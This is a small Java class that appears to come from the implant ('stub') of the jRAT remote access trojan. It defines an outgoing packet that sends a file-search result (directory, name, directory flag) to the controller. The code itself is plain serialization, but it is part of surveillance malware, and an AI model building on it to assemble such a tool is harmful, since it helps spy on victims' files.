package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet37SearchResult extends AbstractOutgoingPacket {

	private String dir;
	private String name;
	private boolean directory;

	public Packet37SearchResult(String dir, String name, boolean directory) {
		this.dir = dir;
		this.name = name;
		this.directory = directory;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(dir);
		sw.writeLine(name);
		dos.writeBoolean(directory);
	}

	@Override
	public byte getPacketId() {
		return 37;
	}

}
